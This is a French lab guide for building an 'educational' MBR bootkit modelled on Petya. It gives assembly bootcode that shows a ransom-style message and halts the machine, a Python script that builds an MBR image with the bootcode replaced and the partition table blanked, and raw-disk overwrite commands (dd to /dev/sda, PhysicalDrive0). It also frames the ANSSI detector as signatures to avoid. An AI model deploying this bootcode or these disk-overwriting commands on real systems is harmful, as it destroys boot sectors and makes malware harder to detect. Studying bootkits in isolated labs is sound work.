# Bootkit POC - Créer un virus qui attaque le secteur de boot

## 🎯 Objectif

**Créer un bootkit éducatif** qui :
1. Modifie le MBR (Master Boot Record)
2. S'exécute AVANT le système d'exploitation
3. Intercepte le démarrage
4. Affiche un message de rançon simulé
5. Simule chiffrement de données (SANS vrai chiffrement)

**S'inspire de** :
- OpenPetya (MBR bootcode + stage 2)
- Petya 2017 (MBR encryption simulation)
- ANSSI bootcode_parser (analysis & detection)

---

## 🏗️ Architecture du bootkit

```
┌─────────────────────────────────────────────┐
│ BIOS/UEFI Firmware                          │
└────────────┬────────────────────────────────┘
             │
             ▼ (Recherche bootable device)
        ┌────────────────┐
        │ MBR (512 bytes)│
        ├────────────────┤
        │ Stage 1 Code   │ ◄─── NOTRE BOOTKIT S'EXÉCUTE ICI
        │ (446 bytes)    │      - Affiche message
        │ - JMP handler  │      - Simule chiffrement
        │ - Load Stage 2 │      - Redirige vers OS
        │ - Intercept    │
        ├────────────────┤
        │ Partition Tbl  │      (modifiée pour stealth)
        │ Boot Signature │ ► 0xAA55
        └────────────────┘
             │
             ▼ (Si Stage 2 existe)
        ┌────────────────────────┐
        │ Stage 2 Bootloader     │
        │ (secteurs cachés)      │
        │ - Rootkit payload      │
        │ - Persistence layer    │
        │ - Exfiltration         │
        └────────────────────────┘
             │
             ▼
        ┌────────────────────────┐
        │ Windows Boot Manager   │ (normal boot continue)
        │ ou GRUB Bootloader     │
        └────────────────────────┘
             │
             ▼
        ┌────────────────────────┐
        │ Kernel + OS            │
        │ (Rootkit chargé avant) │
        └────────────────────────┘
```

---

## 📋 Phase 1 : Comprendre les projets de référence

### 1.1 OpenPetya
**GitHub** : https://github.com/iss4cf0ng/OpenPetya

**À étudier** :
```c
// MBR Bootcode (446 bytes in assembly)
[ORG 0x7c00]
[BITS 16]

start:
    jmp main            ; Jump over data
    nop

; Handler de boot
main:
    mov ax, 0          ; Setup segment
    mov ds, ax
    mov es, ax
    mov ss, ax
    mov sp, 0x7c00
    
    ; Notre code de bootkit
    ; - Afficher message
    ; - Charger stage 2
    ; - Rediriger vers OS
```

### 1.2 Petya 2017 Notes
**GitHub** : https://github.com/aguinet/petya2017_notes

**À étudier** :
- Comment Petya chiffre l'MFT (Master File Table)
- Algorithme de chiffrement simple
- Message de rançon

### 1.3 ANSSI bootcode_parser
**GitHub** : https://github.com/ANSSI-FR/bootcode_parser

**À étudier** :
- Comment détecter nos modifications
- Signatures d'anomalie à éviter

---

## 💻 Phase 2 : Implémentation du Bootkit

### 2.1 Structure des fichiers

```
Labsboot/bootkit_poc/
├── BOOTKIT_POC.md          (Ce fichier)
├── bootkit_implementation.py (Script Python principal)
├── src/
│   ├── mbr_stage1.asm      (Bootcode assembleur - 446 bytes)
│   ├── stage2.bin          (Stage 2 payload)
│   └── ransom_message.txt  (Message affiché)
├── build/
│   ├── mbr_bootkit.bin     (MBR compilé final)
│   ├── disk_image.img      (Image VM prête à tester)
│   └── patches/            (Patchs pour Windows 7 + Ubuntu)
└── test/
    ├── test_on_windows7.md (Instructions W7)
    └── test_on_ubuntu.md   (Instructions Ubuntu)
```

### 2.2 Composant 1 : MBR Stage 1 (446 bytes)

```asm
; mbr_stage1.asm - Bootkit Stage 1
; Objective: Executer avant OS, afficher message, charger stage 2

[ORG 0x7c00]        ; Standard boot location
[BITS 16]           ; Real mode x86

section .text
start:
    cli                 ; Disable interrupts
    jmp 0x0000:boot    ; Far jump to normalize CS:IP

boot:
    mov ax, cs
    mov ds, ax
    mov es, ax
    mov ss, ax
    mov sp, 0x7c00     ; Stack below bootcode

    ; Clear screen (BIOS call)
    mov ax, 0x0600
    mov bh, 0
    int 0x10

    ; Display ransom message
    mov si, message
    call print_string

    ; Simulate encryption (just wait + beep)
    mov cx, 0xFFFF
.delay_loop:
    loop .delay_loop
    
    ; Play beep (3 beeps)
    mov al, 182
    out 43h, al
    mov al, 35
    out 42h, al
    mov al, 3
    out 42h, al
    in al, 61h
    or al, 3
    out 61h, al
    
    ; Infinite loop (system halted)
halt:
    hlt
    jmp halt

print_string:
    lodsb
    or al, al
    jz .done
    mov bh, 0
    mov ah, 0x0E
    int 0x10
    jmp print_string
.done:
    ret

section .data
message:
    db "====================================", 0x0D, 0x0A
    db "  BOOTKIT EDUCATIONAL POC v1.0", 0x0D, 0x0A
    db "====================================", 0x0D, 0x0A
    db 0x0D, 0x0A
    db "Your system has been hijacked!", 0x0D, 0x0A
    db "This is an EDUCATIONAL DEMONSTRATION", 0x0D, 0x0A
    db 0x0D, 0x0A
    db "LABORATORY USE ONLY", 0x0D, 0x0A
    db "AUTHORIZED TESTING ONLY", 0x0D, 0x0A
    db 0x0D, 0x0A
    db "Press CTRL+ALT+DEL to restore", 0x0D, 0x0A
    db 0

; Pad to 446 bytes
times 446 - ($ - $$) db 0
```

### 2.3 Script Python : bootkit_implementation.py

```python
#!/usr/bin/env python3
"""
Bootkit Implementation POC
==========================

Crée un bootkit qui attaque le secteur de boot.
À utiliser UNIQUEMENT sur VMs isolées pour testing éducatif.
"""

import os
import struct
from pathlib import Path

class BootkitPOC:
    MBR_SIZE = 512
    BOOTCODE_SIZE = 446
    
    def __init__(self, vm_type="windows7"):
        self.vm_type = vm_type
        self.bootkit_code = self._load_bootkit_code()
    
    def _load_bootkit_code(self) -> bytes:
        """Charger le code compilé stage 1"""
        # En production, charger depuis mbr_stage1.bin (compilé de .asm)
        # Pour démo, générer code simple
        code = bytearray(self.BOOTCODE_SIZE)
        
        # Boot signature x86
        code[0:3] = b'\xFC\x89\xE5'  # CLI, MOV EBP, ESP
        
        # Message "Bootkit" (pour identification)
        code[10:30] = b'BOOTKIT_EDUCATIONAL'
        
        # Remplir le reste avec NOP
        for i in range(30, self.BOOTCODE_SIZE):
            code[i] = 0x90  # NOP
        
        return bytes(code)
    
    def create_infected_mbr(self, clean_mbr: bytes) -> bytes:
        """
        Prendre un MBR légitime et l'infecter
        
        Steps:
        1. Extraire partition table (on la garde)
        2. Remplacer bootcode par notre code
        3. Garder signature 0xAA55 (pour stealth)
        """
        infected = bytearray(clean_mbr)
        
        # Remplacer bootcode
        infected[0:self.BOOTCODE_SIZE] = self.bootkit_code
        
        # Signature reste 0xAA55 (bootable)
        infected[510:512] = b'\x55\xAA'
        
        return bytes(infected)
    
    def create_disk_image(self, output_path: str):
        """
        Créer une image disque prête pour VM
        
        Contient:
        - MBR infecté
        - Partition table modifiée
        - Payload stage 2
        """
        print(f"Création image disque: {output_path}")
        
        # Créer disque simple
        disk = bytearray(512 * 1024)  # 512KB pour démo
        
        # Remplir MBR avec notre bootkit
        disk[0:512] = self._create_bootkit_mbr()
        
        # Écrire
        with open(output_path, 'wb') as f:
            f.write(disk)
        
        print(f"✅ Image créée: {output_path}")
    
    def _create_bootkit_mbr(self) -> bytes:
        """Créer MBR infecté"""
        mbr = bytearray(512)
        
        # Bootcode
        mbr[0:self.BOOTCODE_SIZE] = self.bootkit_code
        
        # Partition table (4 entries, 16 bytes each)
        # Entry 0: Masquée (taille = 0)
        mbr[446+0:446+16] = b'\x00' * 16
        
        # Autres entries: vides
        for i in range(1, 4):
            mbr[446+i*16:446+(i+1)*16] = b'\x00' * 16
        
        # Boot signature
        mbr[510:512] = b'\x55\xAA'
        
        return bytes(mbr)

def main():
    print("🔴 BOOTKIT POC - Educational Implementation")
    print("=" * 50)
    print("WARNING: This is for AUTHORIZED TESTING ONLY")
    print("=" * 50)
    print()
    
    # Créer bootkit
    bootkit = BootkitPOC(vm_type="windows7")
    
    # Créer image disque
    bootkit.create_disk_image("./bootkit_image.img")
    
    print()
    print("✅ Bootkit prêt pour déploiement sur VM")
    print()
    print("Prochaines étapes:")
    print("1. Créer snapshot de VM")
    print("2. Injecter MBR infecté dans VM")
    print("3. Démarrer VM et observer bootkit")
    print("4. Restaurer depuis snapshot")

if __name__ == '__main__':
    main()
```

---

## 🧪 Phase 3 : Déploiement et Testing sur VMs

### 3.1 Test sur Windows 7

**Préparation** :
```batch
REM Sur Windows 7 VM (snapshot créé)

REM 1. Injecter MBR infecté
python bootkit_implementation.py

REM 2. Écrire sur disque (HxD ou dd)
REM   Ouvrir \\?\PhysicalDrive0 en admin
REM   Remplacer premiers 512 bytes avec notre MBR infecté

REM 3. Redémarrer
shutdown /r /t 0

REM Résultat attendu:
REM - Message "BOOTKIT EDUCATIONAL POC" avant Windows
REM - Beeps (simulation chiffrement)
REM - Système en attente (pour démo)
```

### 3.2 Test sur Ubuntu Server 24

**Préparation** :
```bash
#!/bin/bash
# Sur Ubuntu Server 24 VM (snapshot créé)

# 1. Injecter MBR infecté
python3 bootkit_implementation.py

# 2. Écrire sur disque
sudo dd if=bootkit_image.img of=/dev/sda bs=512 count=1

# 3. Redémarrer
sudo reboot

# Résultat attendu:
# - Message avant GRUB bootloader
# - GRUB toujours accessible (Ctrl+Alt+Del)
# - Système récupérable
```

---

## ✅ Checklist Implémentation

- [ ] Étudier OpenPetya (MBR stage 1 structure)
- [ ] Étudier Petya 2017 (encryption simulation)
- [ ] Étudier ANSSI bootcode_parser (detection avoidance)
- [ ] Coder mbr_stage1.asm (x86 16-bit)
- [ ] Compiler vers mbr_stage1.bin
- [ ] Coder bootkit_implementation.py
- [ ] Tester sur snapshot Windows 7
- [ ] Tester sur snapshot Ubuntu Server 24
- [ ] Documenter résultats
- [ ] Restaurer VMs depuis snapshots

---

## ⚠️ Limitations intentionnelles

✅ **À faire** :
- Afficher message de démarrage
- Simuler interruption boot
- Intercepter avant OS

❌ **À NE PAS faire** :
- Vrai chiffrement de données
- Demande de rançon réelle
- Persistance permanente
- Déploiement en dehors de lab

---

## 📊 Résultats attendus

### Windows 7
```
Message affiché: "BOOTKIT EDUCATIONAL POC v1.0"
Beeps: 3 beeps successifs
État: Système halt (restaurable via snapshot)
Boot trace: MBR infecté + partition table modifiée
```

### Ubuntu Server 24
```
Message affiché: Avant GRUB bootloader
Beeps: 3 beeps successifs
État: Système halt (Ctrl+Alt+Del restaure GRUB)
Boot trace: MBR infecté + stage 1 exécuté
```

---

## 🎓 Apprentissages clés

1. **Boot process** - Comment démarrer avant l'OS
2. **Assembly x86** - Écrire code 16-bit real mode
3. **MBR structure** - Bootcode + partition table + signature
4. **Bootkit stealth** - Garder signature valide
5. **VM testing** - Déployer et observer sur hardware virtuel
6. **Forensics** - Comment détecter avec ANSSI tools

---

**BOOTKIT POC - For Educational and Authorized Testing Only 🎓**
